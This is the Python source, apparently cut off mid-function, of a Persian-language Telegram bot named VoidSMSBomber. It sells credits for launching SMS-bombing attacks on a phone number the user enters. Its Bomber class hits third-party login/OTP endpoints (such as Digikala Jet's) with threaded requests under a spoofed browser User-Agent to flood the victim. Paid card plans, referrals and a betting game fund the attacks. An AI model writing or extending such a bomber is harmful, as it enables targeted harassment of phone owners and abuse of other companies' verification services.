import random
import threading
import time
import requests
import os
import sqlite3
import telebot
from telebot import types
from flask import Flask
from datetime import datetime
import traceback

# ==========================================
# 1. وب‌سرور برای سلامت پورت (Render)
# ==========================================
app = Flask(__name__)
@app.route('/')
def health(): return "Bot is running!", 200

# ==========================================
# 2. تنظیمات و دیتابیس
# ==========================================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = 6914309071
CARD_NUMBER = "[شماره_کارت_اینجا]" # ⚠️ شماره کارت خودت رو اینجا بذار
DB_FILE = "bot_database.db"
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

PANEL_IMAGE_URL = "https://i.imgur.com/Z7lvgzO.jpeg"
VIP_DIAMOND_COST = 1000

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY, name TEXT, plan TEXT, diamonds INTEGER, 
        last_daily REAL, sub_expiry REAL, daily_bomb_count INTEGER, last_bomb_date TEXT,
        total_purchases INTEGER DEFAULT 0, invites INTEGER DEFAULT 0)''')
    conn.commit()
    conn.close()
init_db()

def get_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row: return {"user_id": row[0], "name": row[1], "plan": row[2], "diamonds": row[3], "last_daily": row[4], "sub_expiry": row[5], "daily_bomb_count": row[6], "last_bomb_date": row[7], "total_purchases": row[8], "invites": row[9]}
    return None

def save_user(user_id, name, plan, diamonds, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases=0, invites=0):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", 
              (user_id, name, plan, diamonds, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases, invites))
    conn.commit()
    conn.close()

user_states, pending_approvals, active_bombers, active_gift_codes = {}, {}, {}, {}

PLANS = {
    "basic": {"name": "الماس ۱۰۰ عددی", "price": 150, "diamonds": 100},
    "pro": {"name": "الماس ۵۰۰ عددی", "price": 450, "diamonds": 500},
    "vip": {"name": "الماس ۱۲۰۰ عددی", "price": 600, "diamonds": 1200}
}

# ==========================================
# 3. هسته بمبر
# ==========================================
class Bomber:
    def __init__(self, phone_numbers, user_id):
        self.phone_numbers = phone_numbers.split(",") if "," in phone_numbers else [phone_numbers]
        self.user_id = user_id
        self.services = []
        self.load_services()
        self.session = requests.Session()
        self.stop_event = threading.Event()
        self.success = 0
        self.fail = 0

    def load_services(self):
        # ⚠️ لیست سرویس‌ها
        self.services = [
            {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
        ]

    def send_request(self, service, phone):
        if self.stop_event.is_set(): return
        try:
            data = service['data']()
            if 'phone' in data: data['phone'] = phone
            if 'mobile' in data: data['mobile'] = phone
            headers = {'User-Agent': "Mozilla/5.0"}
            method = service['method'].upper()
            use_json = service.get('json', False)
            if method == 'POST':
                if use_json: resp = self.session.post(service['url'], json=data, headers=headers, timeout=5)
                else: resp = self.session.post(service['url'], data=data, headers=headers, timeout=5)
            else:
                resp = self.session.get(service['url'], params=data, headers=headers, timeout=5)
            if resp.status_code in (200, 201, 202, 204): self.success += 1
            else: self.fail += 1
        except: self.fail += 1

    def worker(self, subset, phone):
        for service in subset:
            if self.stop_event.is_set(): break
            self.send_request(service, phone)
            time.sleep(0.3)

    def start(self):
        if not self.services:
            bot.send_message(self.user_id, "❌ لیست سرویس‌ها خالی است.")
            return
        self.success, self.fail = 0, 0
        total = len(self.services) * len(self.phone_numbers)
        chunk_size = max(1, len(self.services) // 15)
        threads = []
        for phone in self.phone_numbers:
            if not phone.startswith("+"): phone = "+98" + phone.lstrip("0")
            chunks = [self.services[i:i + chunk_size] for i in range(0, len(self.services), chunk_size)]
            for chunk in chunks:
                t = threading.Thread(target=self.worker, args=(chunk, phone))
                t.start()
                threads.append(t)
        for t in threads: t.join()
        percent = int((self.success / total) * 100) if total > 0 else 0
        bot.send_message(self.user_id, f"🏁 **گزارش:**\n✅ موفق: {self.success}\n❌ ناموفق: {self.fail}\n📊 درصد: {percent}%", parse_mode='Markdown')
        if self.user_id in active_bombers: del active_bombers[self.user_id]

# ==========================================
# 4. کیبوردها
# ==========================================
def get_reply_keyboard(is_admin=False):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton("🚀 اجرای بمبر"),
        types.KeyboardButton("💎 خرید الماس")
    )
    markup.add(
        types.KeyboardButton("📋 حساب کاربری"),
        types.KeyboardButton("🎁 جایزه روزانه")
    )
    markup.add(
        types.KeyboardButton("🎲 بازی گروهی"),
        types.KeyboardButton("🏆 برترین‌ها")
    )
    markup.add(
        types.KeyboardButton("👑 پنل VIP"),
        types.KeyboardButton("🎧 پشتیبانی")
    )
    if is_admin:
        markup.add(types.KeyboardButton("👑 پنل مدیریت"))
    return markup

def get_main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 اجرای بمبر", callback_data="menu_bomb"),
        types.InlineKeyboardButton("💎 خرید الماس", callback_data="menu_buy")
    )
    markup.add(
        types.InlineKeyboardButton("🎁 جایزه روزانه", callback_data="menu_daily"),
        types.InlineKeyboardButton("📋 حساب کاربری", callback_data="menu_profile")
    )
    markup.add(
        types.InlineKeyboardButton("🏆 برترین‌ها", callback_data="menu_leaderboard"),
        types.InlineKeyboardButton("👥 برترین دعوت‌کنندگان", callback_data="menu_top_inviters")
    )
    markup.add(types.InlineKeyboardButton("👑 پنل VIP (۱۰۰۰ الماس)", callback_data="menu_vip_club"))
    markup.add(types.InlineKeyboardButton("🎧 پشتیبانی", callback_data="menu_support"))
    markup.add(types.InlineKeyboardButton("🔑 کد هدیه", callback_data="menu_gift"))
    return markup

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    
    args = message.text.split()
    if len(args) > 1 and args[1].startswith("ref_"):
        inviter_id = args[1].replace("ref_", "")
        if inviter_id != user_id:
            inviter = get_user(inviter_id)
            if inviter:
                inviter["invites"] += 1
                inviter["diamonds"] += 5
                save_user(**inviter)
                try: bot.send_message(inviter_id, f"🎉 یک نفر با لینک شما وارد شد! ۵ الماس هدیه گرفتید.")
                except: pass

    if not user:
        save_user(user_id, message.from_user.first_name, "none", 0, 0, 0, 0, "2000-01-01", 0, 0)
        
    is_admin = (message.from_user.id == ADMIN_ID)
    caption = f"سلام {message.from_user.first_name}! 👋\nبه ربات **VoidSMSBomber** خوش آمدید."
    try:
        bot.send_photo(message.chat.id, PANEL_IMAGE_URL, caption=caption, reply_markup=get_reply_keyboard(is_admin), parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, caption, reply_markup=get_reply_keyboard(is_admin), parse_mode='Markdown')

# ==========================================
# 5. سیستم بازی گروهی
# ==========================================
active_games = {}

@bot.message_handler(func=lambda message: message.chat.type in ['group', 'supergroup'] and message.text.startswith("بازی "))
def create_game(message):
    try:
        amount = int(message.text.split()[1])
        if amount < 10:
            bot.reply_to(message, "❌ حداقل مبلغ بازی ۱۰ الماس است.")
            return
        if amount > 10000:
            bot.reply_to(message, "❌ حداکثر مبلغ بازی ۱۰۰۰۰ الماس است.")
            return
    except (IndexError, ValueError):
        bot.reply_to(message, "❌ فرمت اشتباه است.\nمثال: `بازی 500`", parse_mode='Markdown')
        return
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    if not user:
        bot.reply_to(message, "❌ ابتدا در چت خصوصی ربات /start کنید.")
        return
    if user['diamonds'] < amount:
        bot.reply_to(message, f"❌ الماس کافی ندارید! (الماس شما: {user['diamonds']})")
        return
    text = (
        f"🎲 **بازی شرطی جدید!**\n\n"
        f"👤 سازنده: **{user['name']}**\n"
        f"💎 مبلغ شرط: **{amount} الماس**\n\n"
        f"⏳ منتظر حریف...\n"
    )
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"🤝 قبول بازی ({amount})", callback_data=f"join_game_{user_id}_{amount}"),
        types.InlineKeyboardButton("❌ لغو بازی", callback_data=f"cancel_game_{user_id}")
    )
    sent_msg = bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode='Markdown')
    active_games[str(sent_msg.message_id)] = {"challenger_id": user_id, "amount": amount, "group_id": str(message.chat.id)}

@bot.callback_query_handler(func=lambda call: call.data.startswith("cancel_game_"))
def cancel_game(call):
    user_id = str(call.from_user.id)
    challenger_id = call.data.replace("cancel_game_", "")
    message_id = str(call.message.message_id)
    if user_id != challenger_id:
        bot.answer_callback_query(call.id, "❌ فقط سازنده بازی می‌تواند آن را لغو کند!", show_alert=True)
        return
    if message_id in active_games:
        del active_games[message_id]
        bot.edit_message_text("❌ **این بازی توسط سازنده لغو شد.**", call.message.chat.id, call.message.message_id)
    else:
        bot.answer_callback_query(call.id, "❌ این بازی قبلاً بسته شده است.", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("join_game_"))
def join_game(call):
    parts = call.data.split("_")
    challenger_id = parts[2]
    amount = int(parts[3])
    message_id = str(call.message.message_id)
    if message_id not in active_games:
        bot.answer_callback_query(call.id, "❌ این بازی بسته شده است.", show_alert=True)
        return
    accepter_id = str(call.from_user.id)
    if accepter_id == challenger_id:
        bot.answer_callback_query(call.id, "❌ شما نمی‌تونید با خودتون بازی کنید!", show_alert=True)
        return
    challenger = get_user(challenger_id)
    accepter = get_user(accepter_id)
    if not accepter:
        bot.answer_callback_query(call.id, "❌ ابتدا در چت خصوصی /start کنید.", show_alert=True)
        return
    if accepter['diamonds'] < amount:
        bot.answer_callback_query(call.id, f"❌ الماس کافی ندارید! (الماس شما: {accepter['diamonds']})", show_alert=True)
        return
    challenger['diamonds'] -= amount
    accepter['diamonds'] -= amount
    save_user(**challenger)
    save_user(**accepter)
    winner = random.choice([challenger, accepter])
    loser = challenger if winner['user_id'] == accepter_id else accepter
    winner['diamonds'] += (amount * 2)
    save_user(**winner)
    del active_games[message_id]
    result_text = (
        f"🏆 **نتیجه بازی!**\n\n"
        f"👤 بازیکن ۱: **{challenger['name']}**\n"
        f"🤝 بازیکن ۲: **{accepter['name']}**\n"
        f"💎 شرط: **{amount} الماس**\n\n"
        f"🥇 **برنده: {winner['name']}** 🎉\n"
        f"💰 جایزه: **{amount * 2} الماس**\n"
        f"😢 بازنده: **{loser['name']}**"
    )
    bot.edit_message_text(result_text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')

# ==========================================
# 6. هندلرهای گروه
# ==========================================
@bot.message_handler(func=lambda message: message.chat.type in ['group', 'supergroup'] and message.text == "موجودی")
def check_balance_group(message):
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    if not user:
        bot.reply_to(message, "❌ ابتدا در چت خصوصی /start کنید.")
        return
    bot.reply_to(message, f"💎 **موجودی شما:**\n\n👤 نام: **{user['name']}**\n💰 الماس: **{user['diamonds']}**\n👑 پلن: **{user['plan']}**", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.chat.type in ['group', 'supergroup'] and message.text == "راهنما")
def group_help(message):
    bot.reply_to(message, "📖 **راهنما:**\n\n🔹 `بازی [مبلغ]` : ساخت بازی\n🔹 `موجودی` : نمایش الماس\n🔹 `برترین‌ها` : کاربران برتر\n🔹 `دعوت‌کنندگان` : دعوت‌کننده‌های برتر\n🔹 `راهنما` : همین پیام", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.chat.type in ['group', 'supergroup'] and message.text == "برترین‌ها")
def group_leaderboard(message):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT name, diamonds FROM users ORDER BY diamonds DESC LIMIT 5")
    rows = c.fetchall()
    conn.close()
    text = "🏆 **۵ کاربر برتر:**\n\n" + "".join([f"{i}. **{row[0]}** ➜ {row[1]} الماس\n" for i, row in enumerate(rows, 1)])
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.chat.type in ['group', 'supergroup'] and message.text == "دعوت‌کنندگان")
def group_top_inviters(message):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT name, invites FROM users ORDER BY invites DESC LIMIT 5")
    rows = c.fetchall()
    conn.close()
    text = "👥 **۵ دعوت‌کننده برتر:**\n\n" + "".join([f"{i}. **{row[0]}** ➜ {row[1]} دعوت\n" for i, row in enumerate(rows, 1)])
    bot.reply_to(message, text, parse_mode='Markdown')

# ==========================================
# 7. هندلرهای دکمه‌های پایین صفحه
# ==========================================
@bot.message_handler(func=lambda message: message.text == "🚀 اجرای بمبر")
def kb_bomb(message):
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    if not user or user['diamonds'] <= 0:
        bot.reply_to(message, "❌ الماس ندارید! ابتدا شارژ کنید.")
        return
    user_states[user_id] = {"state": "waiting_for_phone"}
    bot.reply_to(message, "📞 **شماره را وارد کنید:**", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "💎 خرید الماس")
def kb_buy(message):
    text = "🛒 **پلن‌های الماس:**\n\n"
    markup = types.InlineKeyboardMarkup(row_width=1)
    for key, plan in PLANS.items():
        text += f"💎 **{plan['name']}** | {plan['price']} تومان\n"
        markup.add(types.InlineKeyboardButton(f"خرید {plan['name']}", callback_data=f"buy_{key}"))
    bot.reply_to(message, text, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "📋 حساب کاربری")
def kb_profile(message):
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    plan_name = PLANS.get(user['plan'], {}).get('name', "بدون پلن")
    text = f"📋 **پروفایل:**\n\n👤 نام: {user['name']}\n💎 الماس: **{user['diamonds']}**\n👑 پلن: **{plan_name}**\n👥 دعوت‌ها: **{user['invites']}**"
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "🎁 جایزه روزانه")
def kb_daily(message):
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    if time.time() - user['last_daily'] < 86400:
        bot.reply_to(message, "⏳ امروز گرفته‌اید!")
    else:
        user['diamonds'] += 2
        user['last_daily'] = time.time()
        save_user(**user)
        bot.reply_to(message, "🎉 ۲ الماس رایگان!")

@bot.message_handler(func=lambda message: message.text == "🎲 بازی گروهی")
def kb_game(message):
    bot.reply_to(message, "🎲 برای ساخت بازی، در گروه بنویسید: `بازی [مبلغ]`\nمثال: `بازی 500`", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "🏆 برترین‌ها")
def kb_leaderboard(message):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT name, diamonds FROM users ORDER BY diamonds DESC LIMIT 5")
    rows = c.fetchall()
    conn.close()
    text = "🏆 **۵ کاربر برتر:**\n\n" + "".join([f"{i}. **{row[0]}** ➜ {row[1]} الماس\n" for i, row in enumerate(rows, 1)])
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "👑 پنل VIP")
def kb_vip(message):
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    if user['diamonds'] >= VIP_DIAMOND_COST:
        user['diamonds'] -= VIP_DIAMOND_COST
        user['plan'] = "vip"
        user['sub_expiry'] = time.time() + (30 * 86400)
        save_user(**user)
        bot.reply_to(message, "🎉 تبریک! شما به باشگاه VIP پیوستید.")
    else:
        bot.reply_to(message, f"❌ الماس کافی ندارید! نیاز: {VIP_DIAMOND_COST} الماس.")

@bot.message_handler(func=lambda message: message.text == "🎧 پشتیبانی")
def kb_support(message):
    user_id = str(message.from_user.id)
    user_states[user_id] = {"state": "waiting_for_support"}
    bot.reply_to(message, "🎧 پیام خود را برای پشتیبانی بنویسید:")

@bot.message_handler(func=lambda message: message.text == "👑 پنل مدیریت" and message.from_user.id == ADMIN_ID)
def kb_admin(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 آمار کل", callback_data="admin_stats"),
        types.InlineKeyboardButton("📢 پیام همگانی", callback_data="admin_broadcast"),
        types.InlineKeyboardButton("🎁 شارژ همگانی", callback_data="admin_bulk_charge"),
        types.InlineKeyboardButton("📉 کسر همگانی", callback_data="admin_bulk_deduct"),
        types.InlineKeyboardButton("🔑 ساخت کد هدیه", callback_data="admin_gifts"),
        types.InlineKeyboardButton("👤 مشاهده کاربر", callback_data="admin_view_user"),
        types.InlineKeyboardButton("💾 دریافت بکاپ", callback_data="admin_backup")
    )
    bot.reply_to(message, "👑 **پنل مدیریت**", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['admin'])
def cmd_admin(message):
    if message.from_user.id != ADMIN_ID: return
    kb_admin(message)

# ==========================================
# 8. هندلرهای منو (Callback Queries)
# ==========================================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = str(call.from_user.id)
    user = get_user(user_id)
    
    if call.data == "menu_back":
        caption = "منوی اصلی:"
        try:
            bot.edit_message_media(types.InputMediaPhoto(PANEL_IMAGE_URL, caption=caption, parse_mode='Markdown'), call.message.chat.id, call.message.message_id, reply_markup=get_main_menu())
        except:
            bot.edit_message_text(caption, call.message.chat.id, call.message.message_id, reply_markup=get_main_menu(), parse_mode='Markdown')

    elif call.data == "menu_profile":
        plan_name = PLANS.get(user['plan'], {}).get('name', "بدون پلن")
        text = f"📋 **پروفایل:**\n\n👤 نام: {user['name']}\n💎 الماس: **{user['diamonds']}**\n👑 پلن: **{plan_name}**\n👥 تعداد دعوت: **{user['invites']}**"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_top_inviters":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT name, invites FROM users ORDER BY invites DESC LIMIT 5")
        rows = c.fetchall()
        conn.close()
        text = "👥 **۵ برترین دعوت‌کنندگان:**\n\n" + "".join([f"{i}. **{row[0]}** ➜ {row[1]} دعوت\n" for i, row in enumerate(rows, 1)])
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_daily":
        if time.time() - user['last_daily'] < 86400:
            bot.answer_callback_query(call.id, "⏳ امروز گرفته‌اید!", show_alert=True)
        else:
            user['diamonds'] += 2
            user['last_daily'] = time.time()
            save_user(**user)
            bot.answer_callback_query(call.id, "🎉 ۲ الماس رایگان!", show_alert=True)

    elif call.data == "menu_gift":
        user_states[user_id] = {"state": "waiting_for_gift"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption("🔑 کد هدیه:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == "menu_buy":
        text = "🛒 **پلن‌های الماس:**\n\n"
        markup = types.InlineKeyboardMarkup(row_width=1)
        for key, plan in PLANS.items():
            text += f"💎 **{plan['name']}** | {plan['price']} تومان\n"
            markup.add(types.InlineKeyboardButton(f"خرید {plan['name']}", callback_data=f"buy_{key}"))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data.startswith("buy_"):
        plan_key = call.data.replace("buy_", "")
        plan = PLANS[plan_key]
        user_states[user_id] = {"selected_plan": plan_key}
        text = f"✅ پلن **{plan['name']}** انتخاب شد.\n\n💳 مبلغ **{plan['price']} تومان** را واریز کنید:\n`{CARD_NUMBER}`\n\n📸 سپس **عکس رسید** را بفرستید."
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_buy"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_bomb":
        today = datetime.now().strftime("%Y-%m-%d")
        if user['last_bomb_date'] != today:
            user['last_bomb_date'] = today
            user['daily_bomb_count'] = 0
        if user['daily_bomb_count'] >= 5 and user['plan'] != 'vip':
            bot.answer_callback_query(call.id, "⚠️ سهمیه امروز پر شده!", show_alert=True)
            return
        if user['plan'] == "vip" and user['sub_expiry'] > time.time(): pass
        elif user['diamonds'] <= 0:
            bot.answer_callback_query(call.id, "❌ الماس ندارید!", show_alert=True)
            return
        user_states[user_id] = {"state": "waiting_for_phone"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
        bot.edit_message_caption("📞 **شماره را وارد کنید:**", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_vip_club":
        if user['diamonds'] >= VIP_DIAMOND_COST:
            user['diamonds'] -= VIP_DIAMOND_COST
            user['plan'] = "vip"
            user['sub_expiry'] = time.time() + (30 * 86400)
            save_user(**user)
            bot.answer_callback_query(call.id, f"🎉 تبریک! شما به باشگاه VIP پیوستید.", show_alert=True)
            caption = "👑 **به باشگاه VIP خوش آمدید!**"
        else:
            caption = f"❌ الماس کافی ندارید! نیاز: {VIP_DIAMOND_COST} الماس."
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(caption, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    # ================= ادمین =================
    elif call.data == "admin_stats" and call.from_user.id == ADMIN_ID:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]
        c.execute("SELECT SUM(diamonds) FROM users")
        total_diamonds = c.fetchone()[0] or 0
        conn.close()
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"📊 **آمار:**\n👥 کاربران: {total_users}\n💎 کل الماس‌ها: {total_diamonds}", parse_mode='Markdown')

    elif call.data == "admin_broadcast" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "📝 متن پیام:")
        bot.register_next_step_handler(msg, send_broadcast)

    elif call.data == "admin_bulk_charge" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "🎁 چند الماس به همه کاربران اضافه کنم؟ (فقط عدد):")
        bot.register_next_step_handler(msg, process_bulk_charge)

    elif call.data == "admin_bulk_deduct" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "📉 چند الماس از همه کاربران کم کنم؟ (فقط عدد):")
        bot.register_next_step_handler(msg, process_bulk_deduct)

    elif call.data == "admin_gifts" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "🔑 فرمت: `CODE DIAMONDS` (مثال: `WELCOME 10`):")
        bot.register_next_step_handler(msg, process_make_gift)

    elif call.data == "admin_view_user" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        msg = bot.send_message(call.message.chat.id, "🆔 آیدی عددی کاربر:")
        bot.register_next_step_handler(msg, view_user_admin)

    elif call.data == "admin_backup" and call.from_user.id == ADMIN_ID:
        bot.answer_callback_query(call.id)
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'rb') as f:
                bot.send_document(ADMIN_ID, f)

    elif call.data.startswith("admin_reply_") and call.from_user.id == ADMIN_ID:
        target_user = call.data.replace("admin_reply_", "")
        msg = bot.send_message(call.message.chat.id, "پاسخ خود را بنویسید:")
        bot.register_next_step_handler(msg, lambda m: send_reply_to_user(m, target_user))

    elif call.data.startswith("admin_approve_"):
        req_id = call.data.replace("admin_approve_", "")
        if req_id in pending_approvals:
            data = pending_approvals[req_id]
            uid, plan_key = data["user_id"], data["plan"]
            plan = PLANS[plan_key]
            user_data = get_user(uid)
            if user_data:
                user_data["diamonds"] += plan["diamonds"]
                user_data["total_purchases"] += 1
                save_user(**user_data)
                bot.send_message(uid, f"💎 **پرداخت تایید شد!**\n**{plan['diamonds']}** الماس به حساب شما اضافه شد.", parse_mode='Markdown')
            bot.edit_message_text(f"✅ تایید شد.", call.message.chat.id, call.message.message_id)
            del pending_approvals[req_id]

    elif call.data.startswith("admin_reject_"):
        req_id = call.data.replace("admin_reject_", "")
        if req_id in pending_approvals:
            uid = pending_approvals[req_id]["user_id"]
            bot.edit_message_text("❌ رد شد.", call.message.chat.id, call.message.message_id)
            bot.send_message(uid, "❌ رسید شما رد شد.")
            del pending_approvals[req_id]

# ==========================================
# 9. توابع کمکی و دریافت ورودی‌ها
# ==========================================
def send_broadcast(message):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    count = 0
    for u in users:
        try: bot.send_message(u[0], f"📢 {message.text}"); count += 1; time.sleep(0.1
